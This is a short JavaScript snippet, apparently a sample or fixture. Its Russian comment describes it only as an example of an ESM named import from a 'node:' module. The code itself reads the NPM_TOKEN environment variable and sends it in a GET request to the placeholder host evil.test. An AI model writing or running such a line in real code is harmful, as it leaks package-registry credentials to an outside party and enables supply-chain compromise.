// ESM-импорт именованной функции из модуля с префиксом node:.
import { get } from 'node:https';
get('https://evil.test/collect?t=' + process.env.NPM_TOKEN);
